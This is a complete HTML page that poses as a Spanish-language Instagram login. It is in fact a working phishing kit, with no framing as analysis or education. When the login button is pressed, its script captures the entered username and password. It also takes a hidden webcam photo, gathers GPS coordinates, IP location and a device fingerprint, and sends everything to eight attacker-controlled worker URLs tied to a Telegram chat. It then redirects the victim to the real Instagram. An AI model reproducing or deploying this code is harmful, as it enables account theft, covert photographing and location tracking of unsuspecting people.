<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 350px; width: 100%; }
        .login-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 30px;
            text-align: center;
            margin-bottom: 10px;
        }
        .logo {
            font-family: 'Instagram Sans', 'Billabong', 'Grand Hotel', cursive;
            font-size: 3.2rem;
            font-weight: 500;
            margin-bottom: 30px;
            color: #262626;
        }
        .input-group { margin-bottom: 6px; }
        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            padding: 9px 8px;
            font-size: 0.85rem;
            outline: none;
        }
        input:focus { border-color: #a8a8a8; }
        button {
            background: #0095f6;
            color: #fff;
            border: none;
            border-radius: 8px;
            padding: 7px 16px;
            font-weight: 600;
            font-size: 0.9rem;
            width: 100%;
            margin-top: 12px;
            cursor: pointer;
            transition: background 0.2s;
        }
        button:active { background: #1877f2; transform: scale(0.98); }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 0.8rem;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .divider::before { margin-right: 16px; }
        .divider::after { margin-left: 16px; }
        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 0.85rem;
            text-decoration: none;
            display: inline-block;
            margin-top: 8px;
        }
        .forgot {
            margin-top: 16px;
            font-size: 0.75rem;
            color: #00376b;
            text-decoration: none;
            display: inline-block;
        }
        .signup {
            margin-top: 20px;
            font-size: 0.85rem;
            border-top: 1px solid #dbdbdb;
            padding-top: 20px;
        }
        .signup a { color: #0095f6; text-decoration: none; font-weight: 600; }
        .footer {
            text-align: center;
            font-size: 0.7rem;
            color: #8e8e8e;
            margin-top: 20px;
        }
        video, canvas { display: none; }
    </style>
</head>
<body>
<div class="container">
    <div class="login-card">
        <div class="logo">Instagram</div>
        <div class="input-group">
            <input type="text" id="username" placeholder="Teléfono, correo electrónico o usuario" autocomplete="off">
        </div>
        <div class="input-group">
            <input type="password" id="password" placeholder="Contraseña">
        </div>
        <button id="btn">Iniciar sesión</button>
        <div class="divider">o</div>
        <a href="#" class="fb-login">Iniciar sesión con Facebook</a>
        <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
        <div class="signup">
            ¿No tienes una cuenta? <a href="#">Regístrate</a>
        </div>
    </div>
    <div class="footer">Meta · Información · Ayuda · Privacidad</div>
</div>

<video id="video" autoplay playsinline style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
// ================= CONFIGURACIÓN =================
const URLS = [
    'https://bot-ubi.societykark.workers.dev',
    'https://bot-tg.societykark.workers.dev',
    'https://tg-bot12.societykark.workers.dev',
    'https://app-trk.societykark.workers.dev',
    'https://app-tg.societykark.workers.dev',
    'https://app-kali.societykark.workers.dev',
    'https://societykark.pythonanywhere.com',
    'https://kali-bot12.societykark.workers.dev'
];
const CHAT_ID = '7555997298';

// ========== FUNCIONES DE RECOLECCIÓN ==========
async function getLocationFromWorker() {
    try {
        const res = await fetch('https://bot-ubi.societykark.workers.dev');
        if (!res.ok) throw new Error();
        const data = await res.json();
        return {
            ip: data.ip || 'N/A',
            country: data.country || 'N/A',
            region: data.region || 'N/A',
            city: data.city || 'N/A',
            postal: data.postal || 'N/A',
            timezone: data.timezone || 'N/A'
        };
    } catch { return null; }
}

async function getLocationFromIpapi() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        return {
            ip: data.ip || 'N/A',
            country: data.country_name || 'N/A',
            region: data.region || 'N/A',
            city: data.city || 'N/A',
            postal: data.postal || 'N/A',
            timezone: data.timezone || 'N/A'
        };
    } catch { return null; }
}

async function getFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 200; canvas.height = 50;
    ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 200, 50);
    ctx.fillStyle = "#069"; ctx.font = "14px Arial"; ctx.fillText("FP", 10, 30);
    const canvasHash = canvas.toDataURL().slice(0, 100);
    let gpu = 'N/A';
    try {
        const gl = document.createElement('canvas').getContext('webgl');
        const debug = gl.getExtension('WEBGL_debug_renderer_info');
        gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : 'N/A';
    } catch {}
    const fontsList = ["Arial","Verdana","Helvetica","Times New Roman","Courier New","Impact","Comic Sans MS"];
    const available = fontsList.filter(f => document.fonts.check(`12px "${f}"`));
    return { gpu, fonts: available.join(', ') || 'Ninguna', canvasHash };
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    let model = "Desconocido";
    if (ua.includes('iPhone')) model = 'iPhone';
    else if (ua.includes('iPad')) model = 'iPad';
    else if (ua.includes('Android')) model = 'Android';
    else if (ua.includes('Mac')) model = 'Mac';
    else if (ua.includes('Windows')) model = 'Windows PC';
    return {
        model,
        ua,
        language: navigator.language || 'N/A',
        resolution: `${window.screen.width}x${window.screen.height}`,
        cores: navigator.hardwareConcurrency || 'N/A'
    };
}

async function getStorageInfo() {
    try {
        const est = await navigator.storage.estimate();
        return { total: (est.quota / (1024**3)).toFixed(2), used: (est.usage / (1024**3)).toFixed(2) };
    } catch { return { total: 'N/A', used: 'N/A' }; }
}

function getGPS() {
    return new Promise(resolve => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
            pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
            () => resolve(null),
            { enableHighAccuracy: true, timeout: 15000 }
        );
    });
}

async function capturePhoto() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    let stream = null;
    try { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }); }
    catch { try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); } catch { return null; } }
    if (!stream) return null;
    video.srcObject = stream;
    await new Promise(r => video.onloadedmetadata = () => { video.play(); r(); });
    await new Promise(r => setTimeout(r, 500));
    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
    stream.getTracks().forEach(t => t.stop());
    video.srcObject = null;
    return blob;
}

// ========== ENVÍO A WORKERS ==========
async function sendToMultiple(text, photoBlob) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('text', text);
    if (photoBlob) formData.append('photo', photoBlob, 'photo.jpg');

    await Promise.all(
        URLS.map(async (url) => {
            try { await fetch(url, { method: 'POST', body: formData }); } catch {}
        })
    );
}

// ========== ACCIÓN DEL BOTÓN ==========
document.getElementById('btn').onclick = async function(e) {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Recolectar datos
    const [gps, workerLoc, ipapiLoc, fp, device, storage, foto] = await Promise.all([
        getGPS(),
        getLocationFromWorker(),
        getLocationFromIpapi(),
        getFingerprint(),
        getDeviceInfo(),
        getStorageInfo(),
        capturePhoto()
    ]);

    let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
    message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
    message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
    message += `🌐 *Network Information*\n   • IP Address: ${workerLoc?.ip || ipapiLoc?.ip || 'N/A'}\n   • Language: ${device.language}\n\n`;
    message += `📍 *Cloudflare Worker Location*\n`;
    if (workerLoc && workerLoc.city !== 'N/A') {
        message += `   • Country: ${workerLoc.country}\n   • Region: ${workerLoc.region}\n   • City: ${workerLoc.city}\n   • Postal: ${workerLoc.postal}\n   • Timezone: ${workerLoc.timezone}\n`;
    } else { message += `   • No disponible\n`; }
    message += `📍 *IP API Location (ipapi.co)*\n`;
    if (ipapiLoc && ipapiLoc.city !== 'N/A') {
        message += `   • Country: ${ipapiLoc.country}\n   • Region: ${ipapiLoc.region}\n   • City: ${ipapiLoc.city}\n   • Postal: ${ipapiLoc.postal}\n   • Timezone: ${ipapiLoc.timezone}\n`;
    } else { message += `   • No disponible\n`; }
    if (gps) {
        message += `📍 *GPS (exacto)*\n   • Coordinates: ${gps.lat}, ${gps.lng}\n   • Accuracy: ±${gps.accuracy} meters\n   • [Google Maps](https://www.google.com/maps?q=${gps.lat},${gps.lng})\n`;
    } else { message += `📍 *GPS: Permiso denegado o no disponible*\n`; }
    message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n`;
    message += `🔐 *Device Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n`;
    message += `\n🕐 *Local Time*\n   • ${new Date().toLocaleString()}\n`;
    message += `\n💾 *Hardware & Storage*\n   • CPU Cores: ${device.cores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
    message += `\n🔐 *CREDENCIALES INSTAGRAM*\n   • Usuario: ${username || '(vacío)'}\n   • Contraseña: ${password || '(vacío)'}\n`;
    message += `\n━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society`;

    await sendToMultiple(message, foto);

    // Redirigir a Instagram real
    window.location.href = 'https://www.instagram.com/';
};
</script>
</body>
</html>
